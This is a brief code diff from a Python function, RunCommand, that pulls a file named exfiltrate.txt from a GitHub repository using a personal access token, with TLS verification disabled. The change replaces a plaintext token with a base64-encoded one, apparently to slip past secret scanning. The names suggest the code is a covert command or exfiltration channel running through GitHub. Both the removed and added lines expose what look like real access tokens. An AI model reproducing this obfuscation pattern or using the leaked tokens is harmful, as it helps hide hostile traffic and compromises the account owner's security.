@@ -33,7 +33,7 @@ def RunCommand():
     url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
     headers = {
     'Accept': 'application/vnd.github+json',
-    'Authorization': 'Bearer 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',
+    'Authorization': 'Bearer ' + str(base64.b64decode("Z2l0aHViX3BhdF8xMUFNRU5FN1EwS1NWbGgwTEVkTVVzX28wb2RTOHZmSm5SdG4xamlTUTZFNEhtbzVqaUIyNFE5azRqM21ISVNDemhGQjNOV0pKVVFaVUw1ODFL")),
     }
 
     response = requests.request("GET", url, headers=headers, proxies=proxies, verify=False)
